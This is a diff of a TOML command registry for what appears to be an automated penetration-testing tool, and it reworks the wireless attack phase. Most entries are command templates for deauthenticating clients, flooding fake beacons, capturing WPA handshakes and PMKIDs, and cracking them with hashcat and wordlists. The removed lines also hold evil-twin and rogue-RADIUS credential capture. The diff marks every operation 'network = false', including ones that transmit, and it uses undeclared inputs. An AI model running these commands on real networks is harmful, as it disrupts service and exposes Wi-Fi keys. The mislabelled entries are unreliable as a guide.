@@ -20990,841 +20990,2539 @@ args = ['-sV', '--top-ports', '100', '{rhost}']
 output = 'lines'
 network = true
 
-# --------------------------------------------------------------------------
-# WIRELESS
-# --------------------------------------------------------------------------
+# ==========================================================================
+# PHASE 10 — WIRELESS
+# ==========================================================================
 
 [[capability]]
 id = 'wireless.interface-setup'
 phase = 'wireless'
 label = 'INTERFACE SETUP'
-summary = 'Bring a radio into monitor mode with predictable parameters'
-inputs = [
-  { key = 'interface', type = 'interface', required = false, default = 'wlan0' },
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-]
+summary = 'Prepare wireless interfaces for monitor mode and testing'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0' } ]
 [[capability.provider]]
 binary = 'rfkill'
 [[capability.provider.operation]]
-name = 'List Radios'
-args = ['list']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Unblock Wifi'
-args = ['unblock', 'wifi']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Unblock All'
+name = 'Radio Unblock All'
 args = ['unblock', 'all']
 output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'airmon-ng'
+network = false
 [[capability.provider.operation]]
-name = 'Check Processors'
-args = ['check', 'kill']
+name = 'Radio Status Check'
+args = ['list']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Enable Monitor'
-args = ['start', '{interface}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Disable Monitor'
-args = ['stop', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'iw'
-[[capability.provider.operation]]
-name = 'Device Info'
-args = ['dev']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Set Monitor'
-args = ['dev', '{interface}', 'set', 'type', 'monitor']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Monitor Detail'
-args = ['dev', '{monitor}', 'info']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'ip'
 [[capability.provider.operation]]
-name = 'Link Down'
-args = ['link', 'set', '{interface}', 'down']
+name = 'Link Status Pull'
+args = ['link', 'show', '{iface}']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
-name = 'Link Up'
-args = ['link', 'set', '{interface}', 'up']
+name = 'Link Down Before Mode'
+args = ['link', 'set', '{iface}', 'down']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
-name = 'Link Show'
-args = ['link', 'show', '{monitor}']
+name = 'Link Up After Mode'
+args = ['link', 'set', '{iface}', 'up']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'iwconfig'
+binary = 'airmon-ng'
 [[capability.provider.operation]]
-name = 'Mode Monitor'
-args = ['{interface}', 'mode', 'monitor']
+name = 'Kill Conflicting Processes'
+args = ['check', 'kill']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
-name = 'Set Channel'
-args = ['{monitor}', 'channel', '6']
+name = 'Monitor Mode Enable'
+args = ['start', '{iface}']
 output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Set Power'
-args = ['{monitor}', 'txpower', '30']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.spectrum-reconnaissance'
-phase = 'wireless'
-label = 'SPECTRUM RECONNAISSANCE'
-summary = 'Sweep the spectrum and log every visible network'
-inputs = [
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'band', type = 'text', required = false, default = 'abg' },
-  { key = 'prefix', type = 'path', required = false, default = '/tmp/recon' },
-]
-[[capability.provider]]
-binary = 'airodump-ng'
-[[capability.provider.operation]]
-name = 'Band Sweep'
-args = ['--band', '{band}', '-w', '{prefix}', '--output-format', 'csv,pcap', '{monitor}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Manufacturer Sweep'
-args = ['--manufacturer', '--uptime', '{monitor}']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Five Gigahertz Only'
-args = ['--band', 'a', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'kismet_server'
-[[capability.provider.operation]]
-name = 'Headless Server'
-args = ['-c', '{monitor}', '--no-interactive']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'nmcli'
-[[capability.provider.operation]]
-name = 'Wifi List'
-args = ['-f', 'SSID,BSSID,CHAN,SIGNAL,SECURITY', 'device', 'wifi', 'list']
-output = 'lines'
-network = true
-
-[[capability.provider.operation]]
-name = 'Wifi Rescan'
-args = ['device', 'wifi', 'rescan']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'wavemon'
-[[capability.provider.operation]]
-name = 'Signal Monitor'
-args = ['-i', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'iwlist'
-[[capability.provider.operation]]
-name = 'Cell Scan'
-args = ['{monitor}', 'scan']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.target-enumeration'
-phase = 'wireless'
-label = 'TARGET ENUMERATION'
-summary = 'Lock onto a chosen access point and enumerate it'
-inputs = [
-  { key = 'bssid', type = 'mac', required = true },
-  { key = 'channel', type = 'text', required = false, default = '6' },
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'prefix', type = 'path', required = false, default = '/tmp/target' },
-]
-[[capability.provider]]
-binary = 'airodump-ng'
-[[capability.provider.operation]]
-name = 'Lock Target'
-args = ['--bssid', '{bssid}', '-c', '{channel}', '-w', '{prefix}', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'wash'
-[[capability.provider.operation]]
-name = 'WPS Scan'
-args = ['-i', '{monitor}', '-C']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hcxdumptool'
-[[capability.provider.operation]]
-name = 'AP Enumerate'
-args = ['-i', '{monitor}', '-o', '{prefix}.pcapng']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'mdk4'
-[[capability.provider.operation]]
-name = 'Hidden Probe'
-args = ['{monitor}', 'p', '-t', '{bssid}']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'iw'
 [[capability.provider.operation]]
-name = 'Hardware Detail'
+name = 'Dev Mode Verify'
+args = ['dev', '{iface}mon', 'info']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Phy Capability Dump'
 args = ['phy', 'info']
 output = 'lines'
-network = true
+network = false
+[[capability.provider.operation]]
+name = 'Regulatory Domain Get'
+args = ['reg', 'get']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Regulatory Domain Set'
+args = ['reg', 'set', 'US']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'macchanger'
+[[capability.provider.operation]]
+name = 'Mac Randomize Monitor Iface'
+args = ['-r', '{iface}mon']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Mac Verify'
+args = ['-s', '{iface}mon']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Channel Set Fixed'
+args = ['dev', '{iface}mon', 'set', 'channel', '6', 'HT20']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'ss'
+[[capability.provider.operation]]
+name = 'Local Socket Baseline'
+args = ['-tlnp']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Iface State Artifact Verify'
+args = ['/tmp/iface_state.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Iface Snapshot Hash'
+args = ['/tmp/iface_state.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Interface Report Build'
+args = ['iface_report.py', '--iface', '{iface}', '--out', '/tmp/iface_report.json']
+output = 'json'
+network = false
+
+[[capability]]
+id = 'wireless.monitor-capture'
+phase = 'wireless'
+label = 'MONITOR CAPTURE'
+summary = 'Broad spectrum beacon and client capture on monitor iface'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' } ]
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Band Scan 2G Capture'
+args = ['{iface}', '--band', 'abg', '-w', '/tmp/cap/full_band', '--write-interval', '5']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Channel Hop OUI Collect'
+args = ['{iface}', '--write', '/tmp/cap/oui_scan', '--output-format', 'csv,kismet,netxml']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Fixed Channel AP Focus'
+args = ['{iface}', '-c', '6', '--bssid', '{bssid}', '-w', '/tmp/cap/ch6_focus']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tcpdump'
+[[capability.provider.operation]]
+name = 'Raw Beacon Dump'
+args = ['-i', '{iface}', '-nn', '-w', '/tmp/cap/beacons.pcap', '-c', '5000', 'type mgt subtype beacon']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Beacon Ssid Extract'
+args = ['-r', '/tmp/cap/beacons.pcap', '-T', 'fields', '-e', 'wlan.ssid', '-e', 'wlan.bssid', '-Y', 'wlan.fc.type_subtype==8']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Client Assoc Extract'
+args = ['-r', '/tmp/cap/full_band-01.cap', '-T', 'fields', '-e', 'wlan.sa', '-e', 'wlan.da', '-Y', 'wlan.fc.type_subtype==0']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Hidden Ssid Marker Hunt'
+args = ['-iE', '<length:\\s+0>|hidden', '/tmp/cap/oui_scan-01.csv']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Wps Ap Filter'
+args = ['-E', 'WPS', '/tmp/cap/oui_scan-01.kismet.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Ap Dedup Sort'
+args = ['-u', '/tmp/cap/aps.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Ap Count Tally'
+args = ['-l', '/tmp/cap/aps.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'kismet'
+[[capability.provider.operation]]
+name = 'Kismet Headless Survey'
+args = ['-c', '{iface}:name=tsmon', '--no-console-logging', '-n', '1']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Kismet Csv Parse'
+args = ['kismet_parse.py', '--in', '/tmp/cap/oui_scan-01.kismet.csv', '--out', '/tmp/cap/aps.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Capture Artifact Verify'
+args = ['/tmp/cap/full_band-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Capture Hash Snapshot'
+args = ['/tmp/cap/full_band-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Capture Report Build'
+args = ['capture_report.py', '--in', '/tmp/cap/aps.json', '--out', '/tmp/cap_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'aircrack-ng'
+[[capability.provider.operation]]
+name = 'Capture Integrity Check'
+args = ['--check', '/tmp/cap/ch6_focus-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Airodump Csv Review'
+args = ['/tmp/cap/oui_scan-01.csv']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.ap-discovery'
+phase = 'wireless'
+label = 'AP DISCOVERY'
+summary = 'Enumerate access points, security modes and WPS availability'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' } ]
+[[capability.provider]]
+binary = 'airodump-ng'
+[[capability.provider.operation]]
+name = 'Encryption Filter Scan'
+args = ['{iface}', '--encrypt', 'wpa,wpa2,wpa3', '--write', '/tmp/cap/enc_scan']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Opn Ap Sweep'
+args = ['{iface}', '--encrypt', 'opn', '-w', '/tmp/cap/opn_scan']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wash'
+[[capability.provider.operation]]
+name = 'Wps Enabled Ap Scan'
+args = ['-i', '{iface}', '-C']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'iw'
+[[capability.provider.operation]]
+name = 'Iw Managed Scan'
+args = ['dev', 'wlan0', 'scan', 'flush', 'freq', '2412', '2437', '2462']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'nmcli'
+[[capability.provider.operation]]
+name = 'Nmcli Wifi Rescan'
+args = ['device', 'wifi', 'rescan', 'ifname', 'wlan0']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Nmcli Wifi List Full'
+args = ['-f', 'SSID,BSSID,CHAN,FREQ,SECURITY,SIGNAL', 'device', 'wifi', 'list', 'ifname', 'wlan0']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'tshark'
+[[capability.provider.operation]]
+name = 'Rsn Cipher Extract'
+args = ['-r', '/tmp/cap/enc_scan-01.cap', '-T', 'fields', '-e', 'wlan.rsn.pcs', '-e', 'wlan.rsn.akms', '-Y', 'wlan.fc.type_subtype==8']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Ssid List Extract'
+args = ['-oE', '[^,]+,', '/tmp/cap/enc_scan-01.csv']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Ie Wpa3 Sae Hunt'
+args = ['-iE', 'SAE|WPA3|RSN', '/tmp/cap/enc_scan-01.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Ap Ssid Dedup'
+args = ['-u', '/tmp/cap/ssids.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Discovered Ap Count'
+args = ['-l', '/tmp/cap/ssids.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Ap Inventory Build'
+args = ['ap_inventory.py', '--in', '/tmp/cap/enc_scan-01.csv', '--out', '/tmp/ap_inventory.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'mdk4'
+[[capability.provider.operation]]
+name = 'Beacon Fingerprint Flood Probe'
+args = ['{iface}', 'b', '-f', '{wl:wordlists/ssid_mimic.txt}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'macchanger'
+[[capability.provider.operation]]
+name = 'Rescan Mac Rotate'
+args = ['-r', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Inventory Artifact Verify'
+args = ['/tmp/ap_inventory.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Inventory Hash Snapshot'
+args = ['/tmp/ap_inventory.csv']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Ap Report Build'
+args = ['ap_report.py', '--in', '/tmp/ap_inventory.csv', '--out', '/tmp/ap_report.json']
+output = 'json'
+network = false
 
 [[capability]]
 id = 'wireless.handshake-capture'
 phase = 'wireless'
 label = 'HANDSHAKE CAPTURE'
-summary = 'Capture a four-way handshake from the target network'
-inputs = [
-  { key = 'bssid', type = 'mac', required = true },
-  { key = 'client', type = 'mac', required = false, default = 'ff:ff:ff:ff:ff:ff' },
-  { key = 'channel', type = 'text', required = false, default = '6' },
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'pcap', type = 'file', required = false, default = '/tmp/handshake.pcapng' },
-  { key = 'count', type = 'integer', required = false, default = '5' },
-]
+summary = 'Capture WPA/WPA2 four-way handshakes for offline cracking'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' }, { key = 'bssid', type = 'target', required = true }, { key = 'channel', type = 'port', required = true } ]
 [[capability.provider]]
 binary = 'airodump-ng'
 [[capability.provider.operation]]
-name = 'Channel Watch'
-args = ['-c', '{channel}', '--bssid', '{bssid}', '-w', '{pcap}', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'aireplay-ng'
-[[capability.provider.operation]]
-name = 'Deauth Burst'
-args = ['--deauth', '{count}', '-a', '{bssid}', '-c', '{client}', '{monitor}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hcxdumptool'
-[[capability.provider.operation]]
-name = 'Handshake Capture'
-args = ['-i', '{monitor}', '-o', '{pcap}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'tshark'
-[[capability.provider.operation]]
-name = 'EAPOL Verify'
-args = ['-r', '{pcap}', '-Y', 'eapol']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'mdk4'
-[[capability.provider.operation]]
-name = 'Targeted Deauth'
-args = ['{monitor}', 'd', '-b', '{bssid}', '-c', '{client}']
-output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.pmkid-harvesting'
-phase = 'wireless'
-label = 'PMKID HARVESTING'
-summary = 'Extract RSN PMKID material and convert it to hash format'
-inputs = [
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'pcapng', type = 'file', required = false, default = '/tmp/pmkid.pcapng' },
-  { key = 'hashes', type = 'file', required = false, default = '/tmp/pmkid.22000' },
-]
-[[capability.provider]]
-binary = 'hcxdumptool'
-[[capability.provider.operation]]
-name = 'PMKID Attack'
-args = ['-i', '{monitor}', '-o', '{pcapng}', '--enable_status=1']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hcxpcapngtool'
-[[capability.provider.operation]]
-name = 'Hash Conversion'
-args = ['-o', '{hashes}', '{pcapng}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hcxhashtool'
-[[capability.provider.operation]]
-name = 'Hash Inspect'
-args = ['-i', '{hashes}', '--info=stdout']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'hashcat'
-[[capability.provider.operation]]
-name = 'PMKID Crack'
-args = ['-m', '22000', '{hashes}', '{wl:passwords/rockyou.txt}']
+name = 'Targeted Handshake Listen'
+args = ['{iface}', '-c', '{channel}', '--bssid', '{bssid}', '-w', '/tmp/hs/target_hs']
 output = 'lines'
 network = false
 [[capability.provider]]
-binary = 'wlanhcx2john'
+binary = 'aireplay-ng'
 [[capability.provider.operation]]
-name = 'John Convert'
-args = ['{pcapng}']
+name = 'Directed Deauth Burst'
+args = ['--deauth', '5', '-a', '{bssid}', '-c', '{client}', '{iface}']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.enterprise-attacks'
-phase = 'wireless'
-label = 'ENTERPRISE ATTACKS'
-summary = 'Attack 802.1X enterprise authentication and capture identities'
-inputs = [
-  { key = 'ssid', type = 'text', required = true },
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'capture', type = 'file', required = false, default = '/tmp/enterprise.pcap' },
-]
+network = false
+[[capability.provider.operation]]
+name = 'Broadcast Deauth Nudge'
+args = ['--deauth', '1', '-a', '{bssid}', '{iface}']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Disassoc Variant'
+args = ['--fakeauth', '0', '-e', '{ssid}', '-a', '{bssid}', '{iface}']
+output = 'lines'
+network = false
 [[capability.provider]]
-binary = 'hostapd-wpe'
+binary = 'hcxdumptool'
 [[capability.provider.operation]]
-name = 'Rogue Enterprise'
-args = ['/etc/hostapd-wpe/hostapd-wpe.conf', '-i', '{monitor}']
+name = 'Hcx Targeted Dump'
+args = ['-i', '{iface}', '--enable_status=3', '--filterlist_ap={bssid}', '--filtermode=2', '-o', '/tmp/hs/target.pcapng']
 output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'eaphammer'
+network = false
 [[capability.provider.operation]]
-name = 'Evil Twin'
-args = ['--interface', '{monitor}', '--essid', '{ssid}', '--auth', 'wpa-eap', '--creds']
+name = 'Hcx Passive Band Dump'
+args = ['-i', '{iface}', '--enable_status=1', '-o', '/tmp/hs/passive.pcapng', '-w', '/tmp/hs/potfile.txt', '--max_handshakes=20']
 output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'asleap'
-[[capability.provider.operation]]
-name = 'MSCHAPv2 Crack'
-args = ['-f', 'mschapv2.txt', '-w', '{wl:passwords/rockyou.txt}']
-output = 'lines'
-network = true
-[[capability.provider]]
-binary = 'freeradius-wpe'
-[[capability.provider.operation]]
-name = 'Rogue RADIUS'
-args = ['-X']
-output = 'lines'
-network = true
+network = false
 [[capability.provider]]
 binary = 'tshark'
 [[capability.provider.operation]]
-name = 'Challenge Extract'
-args = ['-r', '{capture}', '-Y', 'eap']
+name = 'Eapol Frame Filter'
+args = ['-r', '/tmp/hs/target_hs-01.cap', '-Y', 'eapol', '-T', 'fields', '-e', 'wlan.sa', '-e', 'eapol.type']
 output = 'lines'
-network = true
-
-[[capability]]
-id = 'wireless.probe-snooping'
-phase = 'wireless'
-label = 'PROBE SNOOPING'
-summary = 'Log client probe requests and identify unassociated devices'
-inputs = [
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'bssid', type = 'mac', required = false, default = '00:00:00:00:00:00' },
-  { key = 'capture', type = 'file', required = false, default = '/tmp/probes.pcap' },
-]
+network = false
 [[capability.provider]]
-binary = 'airodump-ng'
+binary = 'hcxpcapngtool'
 [[capability.provider.operation]]
-name = 'Probe Capture'
-args = ['--band', 'abg', '-w', '{capture}', '{monitor}']
+name = 'Convert To 22000 Hash'
+args = ['-o', '/tmp/hs/hash.22000', '/tmp/hs/target.pcapng']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'tshark'
+binary = 'aircrack-ng'
 [[capability.provider.operation]]
-name = 'Probe Extract'
-args = ['-i', '{monitor}', '-Y', 'wlan.fc.type_subtype==4']
+name = 'Handshake Present Verify'
+args = ['-b', '{bssid}', '/tmp/hs/target_hs-01.cap']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'tcpdump'
+binary = 'grep'
 [[capability.provider.operation]]
-name = 'BPF Probe'
-args = ['-i', '{monitor}', '-w', '{capture}', 'type', 'mgt', 'subtype', 'probe-req']
+name = 'Essid Confirm In Cap'
+args = ['-E', '{ssid}', '/tmp/hs/target_hs-01.cap']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'kismet_server'
+binary = 'file'
 [[capability.provider.operation]]
-name = 'Device Database'
-args = ['-c', '{monitor}', '--no-interactive']
+name = 'Handshake File Verify'
+args = ['/tmp/hs/target_hs-01.cap', '/tmp/hs/hash.22000']
 output = 'lines'
-network = true
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Hash Line Count'
+args = ['-l', '/tmp/hs/hash.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Handshake Hash Snapshot'
+args = ['/tmp/hs/target_hs-01.cap']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Hcx Potfile Review'
+args = ['/tmp/hs/potfile.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Handshake Report Build'
+args = ['hs_report.py', '--in', '/tmp/hs/', '--bssid', '{bssid}', '--out', '/tmp/hs_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Hash Sanity Mode Check'
+args = ['-m', '22000', '-a', '0', '/tmp/hs/hash.22000', '--show']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Hs File Dedup Sort'
+args = ['-u', '/tmp/hs/handshakes.txt']
+output = 'lines'
+network = false
 [[capability.provider]]
 binary = 'mdk4'
 [[capability.provider.operation]]
-name = 'Hidden Stations'
-args = ['{monitor}', 'p', '-t', '{bssid}']
+name = 'Client Directed Beacon Ping'
+args = ['{iface}', 'x', '-c', '{channel}']
 output = 'lines'
-network = true
+network = false
 
 [[capability]]
-id = 'wireless.packet-injection'
+id = 'wireless.pmkid-attack'
 phase = 'wireless'
-label = 'PACKET INJECTION'
-summary = 'Verify card injection capability and analyse decrypted traffic'
-inputs = [
-  { key = 'monitor', type = 'interface', required = false, default = 'wlan0mon' },
-  { key = 'bssid', type = 'mac', required = true },
-  { key = 'pcap', type = 'file', required = false, default = '/tmp/inject.pcap' },
-  { key = 'key', type = 'secret', required = false, default = 'passphrase' },
-]
+label = 'PMKID ATTACK'
+summary = 'Clientless PMKID harvesting and offline cracking'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' }, { key = 'bssid', type = 'target', required = false, default = '' } ]
+[[capability.provider]]
+binary = 'hcxdumptool'
+[[capability.provider.operation]]
+name = 'Pmkid Target Dump'
+args = ['-i', '{iface}', '--enable_status=1', '--filterlist_ap={bssid}', '--filtermode=2', '-o', '/tmp/pmkid/target.pcapng', '--apt']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Pmkid Broadcast Sweep'
+args = ['-i', '{iface}', '--enable_status=1', '-o', '/tmp/pmkid/sweep.pcapng', '--ap_attacks=3']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hcxpcapngtool'
+[[capability.provider.operation]]
+name = 'Extract 22000 Pmkid'
+args = ['-o', '/tmp/pmkid.22000', '/tmp/pmkid/target.pcapng']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Extract 16800 Legacy'
+args = ['-o', '/tmp/pmkid.16800', '--pmkid', '/tmp/pmkid/target.pcapng']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Straight Dict Crack 22000'
+args = ['-m', '22000', '-a', '0', '/tmp/pmkid.22000', '{wl:passwords/rockyou.txt}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Rule Based Crack 22000'
+args = ['-m', '22000', '-a', '0', '/tmp/pmkid.22000', '{wl:passwords/rockyou.txt}', '-r', '{wl:rules/best64.rule}', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider.operation]]
+name = 'Mask Attack 22000'
+args = ['-m', '22000', '-a', '3', '/tmp/pmkid.22000', '?u?l?l?l?l?d?d?d?d', '--potfile-disable']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'cat'
+[[capability.provider.operation]]
+name = 'Cracked Potfile Review'
+args = ['~/.hashcat/hashcat.potfile']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'grep'
+[[capability.provider.operation]]
+name = 'Target Bssid Match Hunt'
+args = ['-E', '{bssid}', '/tmp/pmkid.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'wc'
+[[capability.provider.operation]]
+name = 'Pmkid Entry Count'
+args = ['-l', '/tmp/pmkid.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'file'
+[[capability.provider.operation]]
+name = 'Pmkid Artifact Verify'
+args = ['/tmp/pmkid.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sha256sum'
+[[capability.provider.operation]]
+name = 'Pmkid Hash Snapshot'
+args = ['/tmp/pmkid.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'sort'
+[[capability.provider.operation]]
+name = 'Pmkid Dedup Sort'
+args = ['-u', '/tmp/pmkid.22000']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Pmkid Parse To Json'
+args = ['pmkid_parse.py', '--in', '/tmp/pmkid.22000', '--out', '/tmp/pmkid.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'hashcat'
+[[capability.provider.operation]]
+name = 'Show Cracked Only'
+args = ['-m', '22000', '/tmp/pmkid.22000', '--show', '--potfile-disable', '-o', '/tmp/pmkid_cracked.txt']
+output = 'lines'
+network = false
+[[capability.provider]]
+binary = 'python3'
+[[capability.provider.operation]]
+name = 'Pmkid Report Build'
+args = ['pmkid_report.py', '--in', '/tmp/pmkid.json', '--out', '/tmp/pmkid_report.json']
+output = 'json'
+network = false
+[[capability.provider]]
+binary = 'hcxpcapngtool'
+[[capability.provider.operation]]
+name = 'Ap Info Table Dump'
+args = ['-X', '/tmp/pmkid/ap_info.txt', '/tmp/pmkid/sweep.pcapng']
+output = 'lines'
+network = false
+
+[[capability]]
+id = 'wireless.deauth-testing'
+phase = 'wireless'
+label = 'DEAUTH TESTING'
+summary = 'Controlled deauthentication and resilience testing'
+inputs = [ { key = 'iface', type = 'text', required = false, default = 'wlan0mon' }, { key = 'bssid', type = 'target', required = true }, { key = 'channel', type = 'port', required = true } ]
 [[capability.provider]]
 binary = 'aireplay-ng'
 [[capability.provider.operation]]
-name = 'Injection Test'
-args = ['-9', '{monitor}']
+name = 'Single Deauth Test'
+args = ['--deauth', '1', '-a', '{bssid}', '-c', '{client}', '{iface}']
 output = 'lines'
-network = true
-
+network = false
 [[capability.provider.operation]]
-name = 'ARP Replay'
-args = ['-3', '-b', '{bssid}', '{monitor}']
+name = 'Burst Deauth Test'
+args = ['--deauth', '10', '-a', '{bssid}', '{iface}']
 output = 'lines'
-network = true
+network = false
 [[capability.provider]]
-binary = 'airdecap-ng'
